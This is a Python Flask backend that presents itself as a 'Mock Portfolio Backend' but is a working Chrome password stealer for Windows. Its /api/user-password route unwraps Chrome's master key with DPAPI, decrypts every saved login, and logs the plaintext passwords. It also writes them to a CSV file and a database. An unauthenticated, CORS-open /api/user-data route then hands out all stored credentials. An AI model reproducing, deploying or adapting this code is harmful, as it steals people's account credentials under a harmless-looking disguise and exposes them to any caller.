import sqlite3
from flask import Flask, request, jsonify, render_template_string, Response, session, send_from_directory
from flask_cors import CORS
from functools import wraps
from dotenv import load_dotenv
import os
from Cryptodome.Cipher import AES
import json
import base64
import re
import csv
import shutil
import time
import logging
import platform

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Conditionally import Windows modules
if platform.system() == 'Windows':
    import win32crypt
elif platform.system() == 'Linux':
    import secretstorage
    import binascii
elif platform.system() == 'Darwin':  # macOS
    import keyring

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)
CORS(app)

DATABASE = 'database.db'
PORT = int(os.environ.get('PORT', 5000))

# Fetch admin credentials from environment variables
ADMIN_USERNAME = os.getenv('ADMIN_USERNAME')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD')

def init_db():
    try:
        # Connect to the database and create the table
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Create Table if it does not exist
        cursor.execute(''' 
                        CREATE TABLE IF NOT EXISTS decrypt_password (
                            id INTEGER PRIMARY KEY,
                            url TEXT NOT NULL,
                            username TEXT,
                            password TEXT NOT NULL,
                            timestamp TEXT DEFAULT CURRENT_TIMESTAMP
                        )
                        ''')
        conn.commit()
        conn.close()
        logger.info("Database initialized successfully")
    except sqlite3.Error as e:
        logger.error(f"Database initialization error: {str(e)}")
        raise
    
def get_db_connection():
    try:
        conn = sqlite3.connect(DATABASE)
        conn.row_factory = sqlite3.Row
        return conn
    except sqlite3.Error as e:
        logger.error(f"Database connection error: {str(e)}")
        return None

# Basic Admin Auth Decorator
def require_admin(func):
    @wraps(func)
    def decorated_function(*args, **kwargs):
        try:
            auth = request.authorization
            if not auth or auth.username != ADMIN_USERNAME or auth.password != ADMIN_PASSWORD:
                logger.warning(f"Unauthorized access attempt from {request.remote_addr}")
                return jsonify({"message": "Unauthorized"}), 401
            return func(*args, **kwargs)
        except Exception as e:
            logger.error(f"Authentication error: {str(e)}")
            return jsonify({"message": "Authentication error occurred"}), 500
    return decorated_function

@app.route('/')
def home():
    return "This is Mock Portfolio Backend"

@app.route('/favicon.ico')
def favicon():
    return "", 204

@app.route('/api/get-ip', methods=['GET'])
def get_user_ip():
    try:
        user_ip = request.remote_addr
        forwarded_ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip()
        real_ip = forwarded_ip or user_ip
        return jsonify({"ip": real_ip})
    except Exception as e:
        logger.error(f"Error getting user IP: {str(e)}")
        return jsonify({"error": "Failed to get IP address"}), 500

@app.route('/api/user-data', methods=['GET'])
def get_user_data():
    try:
        conn = get_db_connection()
        if not conn:
            return jsonify({"error": "Database connection failed"}), 500
            
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM decrypt_password')
        rows = cursor.fetchall()
        
        # Return the data as JSON
        data = []
        for row in rows:
            data.append(dict(row))
        
        conn.close()
        return jsonify(data)
    except sqlite3.Error as e:
        logger.error(f"Database error in get_user_data: {str(e)}")
        return jsonify({"error": f"Database error: {str(e)}"}), 500
    except Exception as e:
        logger.error(f"Unexpected error in get_user_data: {str(e)}")
        return jsonify({"error": "An unexpected error occurred"}), 500

@app.route('/api/user-data/<int:id>', methods=['DELETE'])
@require_admin
def delete_user_data(id):
    try:
        # Delete the record with the specified ID
        conn = get_db_connection()
        if not conn:
            return jsonify({"error": "Database connection failed"}), 500
            
        cursor = conn.cursor()
        cursor.execute('DELETE FROM decrypt_password WHERE id = ?', (id,))
        
        if cursor.rowcount == 0:
            conn.close()
            return jsonify({"message": f"No record found with ID {id}"}), 404
            
        conn.commit()
        conn.close()
        
        return jsonify({"message": "User data deleted successfully"})
    except sqlite3.Error as e:
        logger.error(f"Database error in delete_user_data: {str(e)}")
        return jsonify({"error": f"Database error: {str(e)}"}), 500
    except Exception as e:
        logger.error(f"Unexpected error in delete_user_data: {str(e)}")
        return jsonify({"error": "An unexpected error occurred"}), 500

@app.route('/api/user-data', methods=['DELETE'])
@require_admin
def delete_all_user_data():
    try:
        # Delete all records from the decrypt_password table
        conn = get_db_connection()
        if not conn:
            return jsonify({"error": "Database connection failed"}), 500
            
        cursor = conn.cursor()
        cursor.execute('DELETE FROM decrypt_password')
        conn.commit()
        conn.close()
        
        return jsonify({"message": "All user data deleted successfully"})
    except sqlite3.Error as e:
        logger.error(f"Database error in delete_all_user_data: {str(e)}")
        return jsonify({"error": f"Database error: {str(e)}"}), 500
    except Exception as e:
        logger.error(f"Unexpected error in delete_all_user_data: {str(e)}")
        return jsonify({"error": "An unexpected error occurred"}), 500

def add_user_data(id, url, username, password, timestamp):
    try:
        # Insert the new record into the database
        conn = get_db_connection()
        if not conn:
            logger.error("Database connection failed in add_user_data")
            return False
            
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO decrypt_password (id, url, username, password, timestamp) 
            VALUES (?, ?, ?, ?, ?)
        ''', (id, url, username, password, timestamp))
        conn.commit()
        conn.close()
        return True
    except sqlite3.Error as e:
        logger.error(f"Database error in add_user_data: {str(e)}")
        return False
    except Exception as e:
        logger.error(f"Unexpected error in add_user_data: {str(e)}")
        return False

@app.route('/api/user-password', methods=['GET'])
def user_password():
    try:
        system = platform.system()
        
        if system == 'Windows':
            return extract_windows_chrome_passwords()
        elif system == 'Linux':
            return jsonify({"error": "Linux Chrome password extraction not implemented"}), 501
        elif system == 'Darwin':  # macOS
            return jsonify({"error": "macOS Chrome password extraction not implemented"}), 501
        else:
            return jsonify({"error": f"Unsupported platform: {system}"}), 400
            
    except Exception as e:
        logger.error(f"Unhandled exception in user_password: {str(e)}")
        return jsonify({"error": f"An unexpected error occurred: {str(e)}"}), 500

def extract_windows_chrome_passwords():
    try:
        
        CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
        CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))

        if not os.path.exists(CHROME_PATH):
            return jsonify({"error": "Chrome user data directory not found"}), 404
            
        if not os.path.exists(CHROME_PATH_LOCAL_STATE):
            return jsonify({"error": "Chrome local state file not found"}), 404

        def get_secret_key():
            try:
                #(1) Get secretkey from chrome local state
                with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                #Remove suffix DPAPI
                secret_key = secret_key[5:] 
                secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
                return secret_key
            except json.JSONDecodeError as e:
                logger.error(f"JSON decode error: {str(e)}")
                return None
            except Exception as e:
                logger.error(f"Error getting secret key: {str(e)}")
                return None
            
        def decrypt_payload(cipher, payload):
            try:
                return cipher.decrypt(payload)
            except Exception as e:
                logger.error(f"Decrypt payload error: {str(e)}")
                return None

        def generate_cipher(aes_key, iv):
            try:
                return AES.new(aes_key, AES.MODE_GCM, iv)
            except Exception as e:
                logger.error(f"Generate cipher error: {str(e)}")
                return None

        def decrypt_password(ciphertext, secret_key):
            try:
                #(3-a) Initialisation vector for AES decryption
                initialisation_vector = ciphertext[3:15]
                #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
                #Encrypted password is 192 bits
                encrypted_password = ciphertext[15:-16]
                #(4) Build the cipher to decrypt the ciphertext
                cipher = generate_cipher(secret_key, initialisation_vector)
                if not cipher:
                    return ""
                    
                decrypted_pass = decrypt_payload(cipher, encrypted_password)
                if not decrypted_pass:
                    return ""
                    
                decrypted_pass = decrypted_pass.decode()  
                return decrypted_pass
            except Exception as e:
                logger.error(f"Password decryption error: {str(e)}")
                return ""
            
        def get_db_connection_chrome(chrome_path_login_db):
            try:
                logger.info(f"Accessing Chrome DB: {chrome_path_login_db}")
                if os.path.exists("Loginvault.db"):
                    os.remove("Loginvault.db")
                shutil.copy2(chrome_path_login_db, "Loginvault.db") 
                return sqlite3.connect("Loginvault.db")
            except Exception as e:
                logger.error(f"Chrome database connection error: {str(e)}")
                return None
                
        results = []
        #Create Dataframe to store passwords
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            #(1) Get secret key
            secret_key = get_secret_key()
            if not secret_key:
                return jsonify({"error": "Could not retrieve Chrome secret key"}), 500
                
            #Search user profile or default folder (this is where the encrypted login password is stored)
            try:
                folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            except Exception as e:
                logger.error(f"Error listing Chrome profiles: {str(e)}")
                return jsonify({"error": "Could not access Chrome profiles"}), 500
                
            for folder in folders:
                #(2) Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                conn = get_db_connection_chrome(chrome_path_login_db)
                if(secret_key and conn):
                    try:
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for index,login in enumerate(cursor.fetchall()):
                            url = login[0]
                            username = login[1]
                            ciphertext = login[2]
                            if(url!="" and username!="" and ciphertext!=""):
                                #(3) Filter the initialisation vector & encrypted password from ciphertext 
                                #(4) Use AES algorithm to decrypt the password
                                decrypted_password = decrypt_password(ciphertext, secret_key)
                                logger.info(f"Sequence: {index}")
                                logger.info(f"URL: {url}, User Name: {username}, Password: {decrypted_password}")
                                
                                # Save to database
                                timestamp = str(time.time())
                                success = add_user_data(id=index, url=url, username=username, password=decrypted_password, timestamp=timestamp)
                                if success:
                                    results.append({"url": url, "username": username, "password": decrypted_password})
                                
                                csv_writer.writerow([index,url,username,decrypted_password])
                    except sqlite3.Error as e:
                        logger.error(f"SQLite error processing Chrome logins: {str(e)}")
                    except Exception as e:
                        logger.error(f"Error processing Chrome logins: {str(e)}")
                    finally:
                        #Close database connection
                        if conn:
                            cursor.close()
                            conn.close()
                        #Delete temp login db
                        if os.path.exists("Loginvault.db"):
                            try:
                                os.remove("Loginvault.db")
                            except Exception as e:
                                logger.error(f"Error removing temporary login DB: {str(e)}")
        
        return jsonify(results)
    except Exception as e:
        logger.error(f"Unhandled exception in user_password: {str(e)}")
        return jsonify({"error": f"An unexpected error occurred: {str(e)}"}), 500

# Error handler for internal server errors
@app.errorhandler(500)
def handle_500_error(e):
    logger.error(f"Internal server error: {str(e)}")
    return jsonify({"error": "Internal server error occurred"}), 500

# Error handler for not found errors
@app.errorhandler(404)
def handle_404_error(e):
    logger.error(f"Not found error: {str(e)}")
    return jsonify({"error": "The requested resource was not found"}), 404

if __name__ == '__main__':
    try:
        # Initialize the database
        init_db()
        app.run(debug=True, port=PORT)
    except Exception as e:
        logger.critical(f"Failed to start the application: {str(e)}")
